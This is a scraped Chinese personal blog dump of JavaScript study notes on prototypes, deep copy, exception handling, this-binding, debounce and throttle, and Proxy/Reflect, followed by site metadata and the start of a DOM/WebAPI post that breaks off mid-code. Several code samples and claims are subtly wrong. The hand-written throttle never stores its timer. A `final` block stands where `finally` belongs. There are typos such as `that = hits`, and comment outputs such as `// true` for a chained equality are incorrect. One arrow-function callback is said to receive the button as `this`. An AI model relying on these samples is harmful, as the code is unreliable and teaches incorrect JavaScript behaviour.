注意在JS小数运算会出现精度问题，尽量转换为整数后计算 例如0.1 + 0.2计算会出现很长的小数位 因此使用(0.1 * 10 + 0.2 * 10) / 10 面向对象 变成思想 面向过程 分析出解决问题需要的步骤 实现每一个步骤 依次调用步骤 优点 性能更高 适合于根硬件很紧密的东西 缺点 不易维护 不易复用 不易扩展 面向对象 把事务分解为对象 对象之间分工合作 优点： 灵活 代码可复用 容易维护和开发 缺点 性能低 特性： 抽象 封装性 继承性 多态性 构造函数 JS通过狗咱函数来实现封装 因此： 构造函数体现了面向对象的封装特性 构造函数创建的对象彼此独立互不影响 12345678910function ClassName(attr1, attr2) &#123; this.attr1 = attr1 this.attr2 = attr2 this.method = function()&#123; console.log(&quot;Hello&quot;) &#125;&#125;const obj1 = new ClassName(&#x27;obj1&#x27;, &#x27;1&#x27;)const obj2 = new ClassName(&#x27;obj2&#x27;, &#x27;2&#x27;) 但是使用这种方式创建对象是，存在内存浪费 原因是虽然obj1和obj2中的method完全一致 但是当我们使用构造函数new两个不同的对象时，依然会为这两个对象中的method分别分配内存 1console.log(obj1.method === obj2 === method) // false 原型对象prototype 因此原型则用于解决这样的浪费内存的问题 构造函数通过原型来分配的函数是所有对象共享的 所有构造函数都包含prototype属性，指向一个对象，称为原型对象 改对象可以挂载函数，对象实例化不会多次创建原型上函数，以节约内存 将不变的方法定义在prototype对象上，以实现共享 构造函数和原型对象中的this都指向实例化对象 123456789101112function ClassName(attr1, attr2) &#123; this.attr1 = attr1 this.attr2 = attr2&#125;ClassName.prototype.method = function()&#123; console.log(&quot;Hello&quot;)&#125;const obj1 = new ClassName(&#x27;obj1&#x27;, &#x27;1&#x27;)const obj2 = new ClassName(&#x27;obj2&#x27;, &#x27;2&#x27;)console.log(obj1.method === obj2 === method) // true 1234567891011121314let thatfunction ClassName(attr1) &#123; that = hits this.attr1 = attr1&#125;const obj = new ClassName(&quot;obj&quot;)console.log(that === obj) // trueClassName.prototype.method = function()&#123; that = this console.log(&quot;Hello&quot;)&#125;const obj2 = new ClassName(&quot;obj2&quot;)console.log(that === obj2) // true 例如我们可以使用原型对象为数组添加方法： 12345678910111213141516Array.prototype.max = function() &#123; return Math.max(...this)&#125;Array.prototype.min = function() &#123; return Math.min(...this)&#125;Array.prototype.sum = function() &#123; return this.reduce((prev, current) =&gt; prev + current, 0)&#125;console.log([2, 5, 9].max())const arr = [1, 2, 3]console.log(arr.max())console.log(arr.sum()) constructor属性 每个原型对象中都有一个constructor属性 该属性指向，该原型对象，的构造函数，即指向构造函数本身 需要注意的是如下情况： 当我们要为原型添加多个方法时，会想到直接使用一个对象取添加例如 12345678910111213141516171819202122232425262728console.log(Array.constructor) // Array包含ConstructorArray.prototype = &#123; max: function() &#123; return Math.max(...this) &#125;, min: function() &#123; return Math.min(...this) &#125;, sum: function() &#123; return this.reduce((prev, current) =&gt; prev + current, 0) &#125;&#125;console.log(Array.constructor)// 此时Array的原型对象将对视构造函数，因为直接进行了对象值的覆盖// 因此这样赋值时需要将原来的Construct加上Array.prototype = &#123; constructor: Array // 加上当前构造函数的指向 max: function() &#123; return Math.max(...this) &#125;, min: function() &#123; return Math.min(...this) &#125;, sum: function() &#123; return this.reduce((prev, current) =&gt; prev + current, 0) &#125;&#125;console.log(Array.constructor) 对象原型__proto__ 对象原型即对象的原型 每个实例对象中都有一个属性__proto__指向原型对象prototype 之所以实例化对象可以访问构造函数的prototype原型对象中的方法 就是因为对象具有__proto__的存在 但__proto__是JS非标准属性，即不同浏览器的名称可能不同 例如谷歌内核的浏览器使用[[prototype]]来表示__proto__ 该属性是只读的 查看时依然使用obj.__proto__查看 其中也有一个constructor，指向创建该实例对象的构造函数 对象原型VS原型对象 名称 表示 指向 construct this 说明 原型对象 prototype 指向原型对象 指向原型对象的构造函数 指向实例化对象 可以挂载函数，节约内存 对象原型 __proto__ 指向prototype（同上 同上 只读 原型继承 JS中利用原型对象来实现继承，因此称为原型继承 深浅拷贝 进行拷贝时，由于对象类型的数据是引用数据，因此进行简单的赋值无法为新变量开辟新的内存空间，因此对新对象的修改将会导致原对象也发生改变。 123456789const obj = &#123; uname: &#x27;red&#x27;, age: 18&#125;const o = objconsole.log(o)o.age = 20console.log(o) // age = 20console.log(obj) // age = 20 因此针对引用数据类型出现了浅拷贝和深拷贝 浅拷贝 浅拷贝：只拷贝地址 常见的浅拷贝方法： 拷贝对象：Object.assgin() 或者 展开运算符&#123;…obj&#125; 拷贝数组：Array.prototyope.concat() 或者 […arr] 12345678910const obj = &#123; uname: &#x27;red&#x27;, age: 18&#125;const o = &#123; ...obj &#125;// Object.assign(o, obj) 与使用assign等效console.log(o)o.age = 20console.log(o) // age = 20console.log(obj) // age = 18 以这种方式则是使用&#123;&#125;先创建了新的对象，因此进行的是将对旧象内的简单数据类型赋值给新对象的同名属性。因此不会出现同步修改的问题。 但如果其中遇到的对象中的某个属性是复杂数据类型时，由于直接将地址赋值给新对象中的同名属性。 因此其中的对象内容仍然会同步修改： 1234567891011121314const obj = &#123; uname: &#x27;red&#x27;, age: 18, family: &#123; uname: &quot;baby1&quot; &#125;&#125;const o = &#123; ...obj &#125;// Object.assign(o, obj) 与使用assign等效console.log(o)o.age = 20o.famuly.baby = &#x27;baby2&#x27;console.log(o) // age = 20 family.baby = &#x27;baby2&#x27;console.log(obj) // age = 18 family.baby = &#x27;baby2&#x27; 因此浅拷贝只适合拷贝单层复杂引用类型 深拷贝 深拷贝拷贝对象 常见的实现方法有： 通过递归实现深拷贝 lodash/cloneDeep 通过JSON.strngify()实现 递归实现 123456789101112131415function deepCopy(newObj, oldObj) &#123; for (let k in oldObj) &#123; // 处理数组 if(oldObj[k] instanceof Array) &#123; newObj[k] = [] deepCopy(newObj[k], oldObj[k]) &#125; else if (oldObj[k] instanceof Object) &#123; newObj[k] = &#123;&#125; deepCopy(newObj[k], oldObj[k]) &#125; else &#123; // k 属性名 oldObj[k]属性值 newObj[k] = oldObj[k] &#125; &#125;&#125; 做过深拷贝吗，说一下深拷贝是怎么实现的 深拷贝需要做到拷贝得到的新对象的修改不会影响旧对象 要想实现深拷贝需要用到函数递归 当进行普通数据的函数，拷贝是直接赋值即可 但遇到数组、对象这类引用数据类型时，需要再次调用递归函数 需要注意的是要先处理数组，再处理对象 lodash 使用lodash中的clone和cloneDeep函数 1234567let obj = [ &#123;&#x27;a&#x27;: 1&#125;, &#123;&#x27;b&#x27;: 2&#125;];let deep = _.cloneDeep(objects);console.log(deep[0] === objects[0]) // false 利用JSON实现深拷贝 12345678let obj = [ &#123;&#x27;a&#x27;: 1&#125;, &#123;&#x27;b&#x27;: 2&#125;];// 即先将对象序列化为字符串，然后从字符串解析并创建一个新对象const o = JSON.parse(JSON.stringify(obj)) 异常处理 throw 预估代码中可能出现的异常以方便调试 12345678function fn(x, y) &#123; if(!x || !y) &#123; throw new Error(&#x27;没有传递参数&#x27;) &#125; return x + y&#125;console.log(fn()) 抛出异常时程序也会终止 throw后面跟的时错误提示信息 Error对象配合throw使用，能设置更详细的错误信息 try/catch/finally try用于捕获浏览器提供的错误信息 12345678910111213141516171819202122232425function fn(x, y) &#123; try &#123; // 可能出现错误的代码 const p = document.querySelector(&#x27;.p&#x27;) p.style.color = &#x27;red&#x27; &#125; catch (err) &#123; // err中保存了浏览器提供的错误信息 // 拦截错误，提示浏览器提供的错误信息 // 不会中断程序的执行 console.log(err.message) // 也可以配合throw使用 throw new Error(&#x27;报错啦！&#x27;) // 如果要中断这个函数，需要使用return return &#125; final &#123; // 不论有没有异常，finally中的块一定会执行 alert(&#x27;弹出对话框&#x27;) &#125; return x + y&#125;console.log(fn()) try…catch用于捕获错误信息 将预估可能发生错误的代码写在try代码块中 如果try代码块中出现错误，就会执行catch代码块，并截获错误信息 finally代码块不管是否有错误都会执行 debugger debugger是JS中的一个关键字，即相当于在这个位置下了一个断点： 1234567891011121314151617function deepCopy(newObj, oldObj) &#123; // 运行至此浏览器会自动暂停显示断点信息 debugger for (let k in oldObj) &#123; // 处理数组 if(oldObj[k] intanceof Array) &#123; newObj[k] = [] deepCopy(newObj[k], oldObj[k]) &#125; else if (oldObj[k] intanceof Object) &#123; newObj[k] = &#123;&#125; deepCopy(newObj[k], oldObj[k]) &#125; else &#123; // k 属性名 oldObj[k]属性值 newObj[k] = oldObj[k] &#125; &#125;&#125; this指向 普通函数this 谁调用函数，this就指向谁 12345678910111213141516171819202122// 普通函数function fun() &#123; console.log(this)&#125;fun() // this指向window，普通函数都由window调用// 对象方法const user = &#123; name: &#x27;ender&#x27;, walk: function () &#123; console.log(this) &#125;&#125;user.walk() // this指向user// 严格模式&#x27;use strict&#x27;function fn() &#123; console.log(this)&#125;fn() // undefined 严格模式下没有调用者时值为this 需要注意的是，在严格模式下，没有调用者时，this的值为undefined 箭头函数this 箭头函数不具备自己的this 箭头函数默认将this绑定为外层的this，即最近作用域的this 向外层作用域一层一层查找this，直到this有定义 12345678const user = &#123; name: &#x27;ender&#x27;, walk: () =&gt; &#123; console.log(this) &#125;&#125;user.walk() // this指向window，因为外层user没有this，最外层this为widnow 不推荐使用箭头函数的情况 绑定DOM事件 在操作DOM时，使用箭头函数作为回调函数绑定事件，将会导致this无指向错误的问题： 123456789const btn = document.querySelect(&#x27;.btn&#x27;)btn.addeventListener(&#x27;click&#x27;, () =&gt; &#123; console.log(this) // window&#125;)btn.addeventListener(&#x27;click&#x27;, () =&gt; &#123; console.log(this) // .btn的DOM对象&#125;) 基于原型的面向对象 基于原型的面向对象不推荐使用箭头函数 12345678function Person() &#123;&#125;Person.prototype.walk() = () =&gt; &#123; console.log(this + &#x27;正在走路&#x27;)&#125;const p1 = new Person()p1.walk() // this指向window 因为构造函数和原型对象中的this均指向实例 改变this call 调用函数的同时为函数指定this 1fun.call(thisArg, arg1, arg2, ...) thisArg：fun函数中的this的指 arg1, arg2：fun函数的参数 返回值就是函数的返回值 apply 调用函数的同时为函数指定this 1fun.apply(thisArg, [argsArray]) thisArg：fun函数中的this的指 argsArray：可选参数，fun函数参数，传递的值必须包含在数组中 返回值就是函数的返回值 因此apply主要和数组有关，比如利用Math.max()求数组最大值 1const max = Math.max.apply(Math, [1, 2, 3]) bind 不调用函数，改变函数this的指向 1fun.bind(thisArg, arg1, arg2, ...) thisArg：fun函数中的this的指 arg1, arg2：fun函数的参数 返回由指定的this值和初始化参数改造的原函数拷贝（新函数 因此当想要改变this指向，却不想调用函数时使用，比如改变定时器内部的this指向 123456789101112131415// 需求，一个按钮，点击则禁用，2秒后开启const btn = document.querySelect(&#x27;.btn&#x27;)btn.addeventListener(&#x27;click&#x27;, function() &#123; // 禁用按钮 this.disabled = true // 计时器 setTimeout(function()&#123; this.disabled = false &#125;.bind(this), 2000)&#125;)btn.addeventListener(&#x27;click&#x27;, () =&gt; &#123; console.log(this) // .btn的DOM对象&#125;) 此处使用箭头函数也可以达到效果，因为箭头函数的this指向与上一层相同，此处的function是放在setTimeout中的普通函数，因此默认由window调用 方法 参数形式 是否调用 使用场景 call arg1,arg2,... 是 需要调用函数改变this且传递参数 apply [arg1,arg2,...] 是 需要调用函数改变this且与数组相关 bind arg1,arg2,... 否 不调用函数改变this，例如定时器内部函数 防抖(debounce) 单位时间内，频繁出发事件，只执行最后一次 使用场景： 搜索框搜索输入，只需要用户最后一次输入完，在发送请求 手机号、邮箱验证输入检测 123456789101112&lt;body&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;script&gt; const box = document.querySelector(&#x27;box&#x27;) let i = 1 function mouseMove() &#123; // 不进行防抖时，这一代码会在鼠标移动1像素后立即执行，如果是非常复杂的操作，那将造成页面卡顿 box.innterHTML = i++ &#125; box.addEventListener(&#x27;mousemove&#x27;, mouseMove)&lt;/script&gt; 因此有两种方案处理这一问题： lodash提供的防抖函数 手写防抖函数 lodash 1_.debounce(func, [wait = 0], [options=]) 该函数会从上一次被调用后，延迟wait毫秒后调用func方法 1234567891011121314&lt;body&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt; &lt;script src=&#x27;./js/lodash.min.js&#x27;&gt;&lt;/script&gt; &lt;script&gt; const box = document.querySelector(&#x27;box&#x27;) let i = 1 function mouseMove() &#123; // 不进行防抖时，这一代码会在鼠标移动1像素后立即执行，如果是非常复杂的操作，那将造成页面卡顿 box.innterHTML = i++ &#125; // 实现鼠标移动500毫秒之后+1 box.addEventListener(&#x27;mousemove&#x27;, _.debounce(mouseMove, 500)) &lt;/script&gt;&lt;/body&gt; 手写防抖函数 声明一个定时器变量 当事件发生时先判断是否存在定时器，如果存在则清空定时器 如果没有定时器则开启定时器，保存到变量中 在定时器中调用要执行的函数 1234567891011121314151617181920212223&lt;body&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt; &lt;script&gt; const box = document.querySelector(&#x27;box&#x27;) let i = 1 function mouseMove() &#123; // 不进行防抖时，这一代码会在鼠标移动1像素后立即执行，如果是非常复杂的操作，那将造成页面卡顿 box.innterHTML = i++ &#125; // 实现鼠标移动500毫秒之后+1 box.addEventListener(&#x27;mousemove&#x27;, debounce(mouseMove, 500)) function debounce(fn, t) &#123; let timer = null return function() &#123; if(timer) clearTimeout(timer) timer = setTimeout(function()&#123; fn() &#125;, t) &#125; &#125; &lt;/script&gt;&lt;/body&gt; 节流(throttle) 单位时间内频繁出发事件，只执行一次 使用场景：高频事件 鼠标移动mousemove 页面尺寸缩放resize 滚动条滚动scroll 要求不管鼠标移动多少次，每隔500ms才 + 1 123456789101112&lt;body&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;script&gt; const box = document.querySelector(&#x27;box&#x27;) let i = 1 function mouseMove() &#123; // 不进行防抖时，这一代码会在鼠标移动1像素后立即执行，如果是非常复杂的操作，那将造成页面卡顿 box.innterHTML = i++ &#125; box.addEventListener(&#x27;mousemove&#x27;, mouseMove)&lt;/script&gt; 实现方法： lodash节流函数 手写节流函数 lodash.throttle 1_.throttle(func, [wait=0], [option=]) 在wait秒内最多执行func一次 提供一个cancel()方法取消延迟调用 提供一个flush()方法立即调用 options.leading=true指定调用在节流开始前 options.leading=true指定调用在节流开始后 12345678910111213&lt;body&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;script&gt; const box = document.querySelector(&#x27;box&#x27;) let i = 1 function mouseMove() &#123; // 不进行防抖时，这一代码会在鼠标移动1像素后立即执行，如果是非常复杂的操作，那将造成页面卡顿 box.innterHTML = i++ &#125; // 每500ms只执行一次 box.addEventListener(&#x27;mousemove&#x27;, _.throttle(mouseMove, 500))&lt;/script&gt; 手写节流函数 核心思想: 声明一个定时器变量 当事件发生时先判断是否有定时器，如果有则不开启新的定时器 如果没有则开启定时器，赋值给定时器变量 定时器中调用函数 定时器中把定时器清空 12345678910111213141516171819202122232425&lt;body&gt; &lt;div class=&quot;box&quot;&gt;&lt;/div&gt; &lt;script&gt; const box = document.querySelector(&#x27;box&#x27;) let i = 1 function mouseMove() &#123; // 不进行防抖时，这一代码会在鼠标移动1像素后立即执行，如果是非常复杂的操作，那将造成页面卡顿 box.innterHTML = i++ &#125; // 实现鼠标移动500毫秒之后+1 box.addEventListener(&#x27;mousemove&#x27;, throttle(mouseMove, 500)) function throttle(fn, t) &#123; let timer = null return function() &#123; if(!timer) setTimeout(function() &#123; // 调用函数 fn() //清空定时器, 此处不能使用clearTimeout timer = null &#125;, t) &#125; &#125; &lt;/script&gt;&lt;/body&gt; 注意事项： setTimeout中无法删除定时器，因为定时器仍然在运作，因此使用timer = null，而不是clearTimeout(timer) 防抖与节流 性能优化 说明 使用场景 防抖 单位时间内频繁触发事件，只执行最后一次 搜索框输入、手机号、邮箱验证 节流 单位时间内频繁触发事件，只执行一次 高频事件：鼠标移动，页面缩放，滚动条滚动 Proxy Proxy是ES6种新增的语法，用于修改某些操作的默认行为，等同于在语言层面做出修改，属于一种元编程（对编程语言进行编程） 可以理解为在目标对象之前设置了一层拦截器： 外界对该对象的访问都必须先通过这层拦截 即可以对外界的访问进行了过滤和改写 下面这段代码使用Proxy修改了一个空对象的访问与设置操作： 12345678910var obj = new Proxy(&#123;&#125;, &#123; get: function (target, propKey, receiver) &#123; console.log(`getting $&#123;propKey&#125;!`); return Reflect.get(target, propKey, receiver); &#125;, set: function (target, propKey, value, receiver) &#123; console.log(`setting $&#123;propKey&#125;!`); return Reflect.set(target, propKey, value, receiver); &#125;&#125;); 因此进行如下操作时会得到额外的结果： 123456obj.count = 1// setting count!++obj.count// getting count!// setting count!// 2 直观上俩看Proxy重载了.运算符 其语法模板为： 1let proxy = new Proxy(target, handler); target接收一个对象，即需要拦截的具体对象 handler接收一个对象作为拦截器，用于定义拦截行为 需要注意的是如果希望proxy起作用就必须对proxy对象进行操作： 12345var target = &#123;&#125;;var handler = &#123;&#125;;var proxy = new Proxy(target, handler);proxy.a = &#x27;b&#x27;;target.a // &quot;b&quot; 一个实用技巧就是将proxy对象设置为原对象的一个属性： 1var object = &#123; proxy: new Proxy(target, handler) &#125;; proxy对象也能作为其他对象的原型对象，且其中的拦截器会被继承： 12345678var proxy = new Proxy(&#123;&#125;, &#123; get: function(target, propKey) &#123; return 35; &#125;&#125;);let obj = Object.create(proxy);obj.time // 35 拦截器一共支持13种操作的拦截： get(targte, propKey, receiver) 拦截对象属性的读取proxy.attr或proxy['attr'] target为拦截对象 propKey接收访问的参数Key值 receiver指向原始的读操作所在的那个对象即原本的target.propKey所指向的值，如果没有则会向target的原型中查找 除了使用上面的创建方式外，还可以使用get:function(targte, propKey, receiver)的形式来让get变为执行一个函数 此处展示一个使用该方法创建的函数链式调用栈的方法： let pipe = function (value) &#123; // funcStack与Proxy构成闭包 // 即进行链式调用时访问的作用域始终为pipe作用域 let funcStack = []; let oproxy = new Proxy(&#123;&#125; , &#123; get : function (pipeObject, fnName) &#123; // 调用get方法则进行计算 if (fnName === &#x27;get&#x27;) &#123; // 使用reduce函数，将value设为初始值则第一次调用时val=value // 之后val=fn(val)返回的结果 return funcStack.reduce(function (val, fn) &#123; return fn(val); &#125;,value); &#125; // 在调用get之前不进行计算，只将调用的函数保存 // 函数通过变量名从window对象种查找 funcStack.push(window[fnName]); // 每次返回一个代理对象，保证代理对象均包含get拦截器 return oproxy; &#125; &#125;); return oproxy; &#125; // 此处函数的作用域需要时全局作用域才能使用window[fnName]访问到 var double = n =&gt; n * 2; var pow = n =&gt; n * n; var reverseInt = n =&gt; n.toString().split(&quot;&quot;).reverse().join(&quot;&quot;) | 0; pipe(3).double.pow.reverseInt.get; // 63 set(target, propKey, value, receiver) 阻拦对象的属性设置行为例如proxy.propKey=v,proxy['propKey'] = v 返回一个bool值 has(target, propKey) 拦截propKey in proxy的操作，返回一个布尔值。 deleteProperty(target, propKey) 拦截delete proxy[propKey]的操作，返回一个布尔值。 ownKeys(target) 拦截Object.getOwnPropertyNames(proxy)、Object.getOwnPropertySymbols(proxy)、Object.keys(proxy)、for...in循环 返回一个数组 该方法返回目标对象所有自身的属性的属性名，而Object.keys()的返回结果仅包括目标对象自身的可遍历属性。 getOwnPropertyDescriptor(target, propKey) 拦截Object.getOwnPropertyDescriptor(proxy, propKey) 返回属性的描述对象。 defineProperty(target, propKey, propDesc) 拦截Object.defineProperty(proxy, propKey, propDesc）、Object.defineProperties(proxy, propDescs) 返回一个布尔值。 preventExtensions(target) 拦截Object.preventExtensions(proxy) 返回一个布尔值。 getPrototypeOf(target) 拦截Object.getPrototypeOf(proxy) 返回一个对象。 isExtensible(target) 拦截Object.isExtensible(proxy) 返回一个布尔值。 setPrototypeOf(target, proto) 拦截Object.setPrototypeOf(proxy, proto) 返回一个布尔值。 如果目标对象是函数，那么还有两种额外操作可以拦截。 apply(target, object, args) 拦截 Proxy 实例作为函数调用的操作，比如proxy(...args)、proxy.call(object, ...args)、proxy.apply(...) construct(target, args) 拦截 Proxy 实例作为构造函数调用的操作，比如new proxy(...args) Reflect Reflect对象与Proxy对象一样，也是 ES6 为了操作对象而提供的新 API Reflect对象的设计目的如下： 将Object对象的一些明显属于语言内部的方法（比如Object.defineProperty），放到Reflect对象上（目前Object和Reflect均包含这些方法 修改某些Object方法的返回结果，让其返回值更合理。 让Object操作都变成函数行为。例如delete obj[name]等价于Reflect.deleteProperty(obj, name) Reflect对象的方法与Proxy对象的方法一一对应，只要是Proxy对象的方法，就能在Reflect对象上找到对应的方法。 目前Reflect提供的方法有如下13中： Reflect.apply(target, thisArg, args) Reflect.construct(target, args) Reflect.get(target, name, receiver) Reflect.set(target, name, value, receiver) Reflect.defineProperty(target, name, desc) Reflect.deleteProperty(target, name) Reflect.has(target, name) Reflect.ownKeys(target) Reflect.isExtensible(target) Reflect.preventExtensions(target) Reflect.getOwnPropertyDescriptor(target, name) Reflect.getPrototypeOf(target) Reflect.setPrototypeOf(target, prototype)","categories":[{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"JS","slug":"前端/JS","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/JS/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"JS","slug":"JS","permalink":"http://enderxiao.github.io/tags/JS/"},{"name":"ES6","slug":"ES6","permalink":"http://enderxiao.github.io/tags/ES6/"}]},{"title":"前端JS补缺NodeJS","slug":"前端JS补缺NodeJS","date":"2023-07-10T01:40:59.000Z","updated":"2024-07-30T11:26:33.924Z","comments":true,"path":"2023/07/10/前端JS补缺NodeJS/","permalink":"http://enderxiao.github.io/2023/07/10/%E5%89%8D%E7%AB%AFJS%E8%A1%A5%E7%BC%BANodeJS/","excerpt":"根据前端技能树补缺JS知识","text":"根据前端技能树补缺JS知识","categories":[{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"JS","slug":"前端/JS","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/JS/"},{"name":"NodeJS","slug":"前端/JS/NodeJS","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/JS/NodeJS/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"JS","slug":"JS","permalink":"http://enderxiao.github.io/tags/JS/"},{"name":"NodeJS","slug":"NodeJS","permalink":"http://enderxiao.github.io/tags/NodeJS/"}]},{"title":"前端JS补缺WEBAPI","slug":"前端JS补缺WEBAPI","date":"2023-07-07T08:19:55.000Z","updated":"2024-07-30T11:26:33.925Z","comments":true,"path":"2023/07/07/前端JS补缺WEBAPI/","permalink":"http://enderxiao.github.io/2023/07/07/%E5%89%8D%E7%AB%AFJS%E8%A1%A5%E7%BC%BAWEBAPI/","excerpt":"","text":"变量声明 优先使用const 当需要改变对象时再将其改为let 因为实际开发中大多使用Object变量，其在栈中存储的值一直不会改变，而是改变堆中的数据，因此这些都能使用const进行定义 WebAPI 作用：使用JS操作html和浏览器 分类： DOM（文档对象模型）用来呈现以及与任意HTML或XML文档交互的API，即操作网页内容 BOM（浏览器对象模型） DOM 文件对象模型，用来呈现以及与任意HTML或XML文档交互的API 作用：开发网页内容特效和实现用户交互 DOM树 将HTML以树型结构直观地表现出来，我们称之为文档树或DOM树 描述网页内容关系的名词 作用：文档树直观的体现了标签与标签之间的关系 DOM对象 DOM对象指浏览器根据html标签生成的JS对象 所有标签都可以在这个对象上找到 修改这个对象的属性会自动映射到标签身上 DOM的核心思想 把网页内容当作对象处理 document对象 是DOM提供的一个对象 提供的属性和方法都是用来访问和操作网页内容的 网页的所有内容都在document中 获取DOM 利用CSS选择器获取DOM document.querySelector('css选择器')选择第一个css匹配的元素 document.querySelectorAll('css选择器')选择多个匹配的元素，得到对象伪数组，但这个数组只有长度，索引，但并没有pop()和push()方法 document.getElementById('nav')根据ID获取，获取单个 document.getElementByTagName('div')根据标签名获取获取伪数组 document.getElementByClassName('w')根据类名获取伪数组 操作内容 .innerText属性 获取文字内容 显示为纯文本，不解析HTML .innerHTML属性 将文本内容添加/更新到任意标签位置 会解析HTML，多标签建议使用模板字符 操作元素属性 操作常用属性 obj.attr = newValue 操作样式属性 通过style属性操作CSS obj.style.width = '200px' 属性中的短横线属性的属性名将自动被转换为小驼峰命名 通过className属性操作CSS obj.className = 'nav' 之一操作将会直接覆盖以前的类名 通过classList操作CSS 这一操作可以实现追加、删除类名 box.classList.add('active') box.classList.remove('active') box.classList.toggle('active')可以实现如果有active就删掉，如果没有就加上的效果 于是，使用className和classList的区别在于： classList修改大量样式的时候更方便 className修改不多样式的时候更方便 classList追加和删除不影响原本有的类名 操作表单元素属性 获取DOM： DOMObj.attr 设置DOM： DOMObj.attr = newValue 获取表单对象中的值： DOMObj.value 但&lt;button&gt;&lt;/button&gt;双标签的内容获取比较特殊，需要使用innerHTML获取 表单中使用bool为表单元素添加状态例如： disable input.checked = true 或者使用input.checked = 'true'，此处进行了隐式类型转换，因为'true'转化为boolean的值也为true checked selected 操作自定义属性 自定义属性是html5中推出的新特性，以data-开头，在DOM对象上一律以dataset对象方式获取 JS通过dataset方式访问： 12const one = document.querySelect(&#x27;div&#x27;)console.log(one.dataset) 该方式返回所有自定义属性的集合，之后按自定义属性名data-attr后的attr访问即可得到值： 1console.log(one.dataset.attr) 定时器和间歇函数 间歇函数 可以使用定时器函数重复执行代码 开定时器 setInterval(函数名, 间隔时间) setInterval('函数名()', 间隔时间)（极少使用 每隔间隔时间调用函数 间隔时间单位为毫秒 该set函数返回一个id数字表示定时器编号 关闭定时器 clearInterval(定时器id) 事件监听 事件：系统内发生的动作或者发生的事情 事件监听：让程序检测是否有事件产生，一旦事件出发就立即调用函数做出响应 添加事件监听： obj.addEventListener('事件类型',要执行的函数) 事件监听三要素： 事件源：哪个DOM元素的事件被触发了，要获取DOM元素 事件类型：用什么方式触发的，例如click、mouseover等 事件调用的函数：做什么 事件监听版本 DOM L0 是DOM的第一个版本 事件源.on事件 = function()&#123;&#125; 这种写法实际上是通过onclick属性进行绑定，因此当绑定多个相同事件类型的事件时，后面的事件会覆盖前面的事件 因此直接赋值null即可解绑 都是冒泡阶段执行（即这一写法只有冒泡，没有捕获 DOM L1 1998年10月1日成为W3C推荐标准 DOM L2 添加addEnventListener注册事件 事件源.addEnventListener(事件, 事件处理函数, 是否使用捕获（否则冒泡) 事件不会出现发生覆盖 可以做事件冒泡，可以做事件捕获 可以通过第三个参数确定实在冒泡阶段执行还是捕获阶段执行 必须使用removeEventListener 匿名函数无法被解绑 DOM L3 在DOM L2事件的基础上重新定义了这些事件，并添加了一些新的事件类型 事件类型 鼠标事件 click mouseenter 鼠标经过（无冒泡 推荐 mouseleave 鼠标离开（无冒泡 推荐 mouseover 鼠标经过（有冒泡 mouseout 鼠标离开（有冒泡 焦点事件 focus 获得焦点 blur 失去焦点 键盘事件 Keydown 键盘按下触发 Keyup 键盘抬起触发 文本事件 input 用户输入事件 需要注意鼠标事件中的mouseover和mouseout两个事件： 123456789101112131415161718192021222324252627282930&lt;html&gt; &lt;style&gt; .dad&#123; width:200px; height:200px; background: pink; &#125; .son&#123; width: 100px; height: 100px; background: purple; &#125; &lt;/style&gt; &lt;body&gt; &lt;div class=&quot;dad&quot;&gt; &lt;div class=&quot;son&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; const dad = document.querySelect(&#x27;.dad&#x27;) const son = document.querySelect(&#x27;.son&#x27;) dad.addEventListener(&#x27;mousover&#x27;, function ()&#123; console.log(&quot;鼠标经过&quot;) &#125;) dad.addEventListener(&#x27;mousout&#x27;, function ()&#123; console.log(&quot;鼠标离开&quot;) &#125;) &lt;/script&gt;&lt;/html&gt; 上述案例中，鼠标先经过dad，会触发一次mouseover事件，打印鼠标经过， 接着鼠标从dad移动到son时会触发一次mouseout事件，打印鼠标离开， 最后由于鼠标经过son，触发son的mouseover事件并冒泡到dad节点，因此还会触发dad的mouseover事件，打印一次鼠标经过 事件对象 该对象包含事件触发时的相关信息 获取 事件绑定的回调函数的第一个参数 一般命名为event、ev、e obj.addEventListener('click', function(e)&#123;&#125;) 部分常用属性 type 当前事件类型 clientX/clientY 光标相互对于浏览器可见窗口左上角的坐标 offsetX/offsetY 光标相对于当前DOM元素左上角的位置 key 用户按下的键盘的值 现在不提倡使用KeyCode属性（已经废弃，被code属性代替，但code很多浏览器还未实现（2023-3-29 环境对象 指函数内部特殊的变量this，它代表当前函数运行时所处的环境 每个函数都有this环境对象 在普通函数中，this指向window 123function fn() &#123; console.log(this) // window&#123;&#125;&#125; 事实上this指向的是函数的调用者，普通函数的调用者均为window对象 因此事件函数中的this指向的是事件源 但箭头函数没有this，他会继承外部的this 并且this的指向可以通过call，apply改变指向 回调函数 定义：如果将函数A作为参数传递给函数B时，称函数A为回调函数 事件流 事件流指事件完整执行过程中的流动路径 事件流分为两个阶段： 捕获阶段 DOM会从根节点Document开始逐级向下捕获事件 冒泡阶段 DOM查找到触发事件的元素后，该元素会逐级向上将事件传递到根节点Document，这一过程称为事件冒泡 实际工作中大部分是使用事件冒泡 事件捕获 从DOM的根元素开始去执行对应的事件（从外到里） 事件捕获需要在事件绑定阶段添加第三个参数查看： DOM.addEventListener(事件类型， 事件处理函数， 是否使用捕获机制) 传入true则查看事件捕获（默认为false 传入false代表冒泡阶段触发 DOM L0只有冒泡没有捕获（IE浏览器不支持捕获 事件冒泡 当一个元素的事件被触发时，同样的事件将会在该元素的所有祖先元素，这一过程称为冒泡 事件冒泡默认存在 L2监听事件的第三个参数是false，或者默认冒泡 阻止冒泡 由于冒泡的默认存在，则容易影响父级元素 则可以是用如下语法组织之间冒泡 eventObj.stopPropagation() 1234let DOMObj = 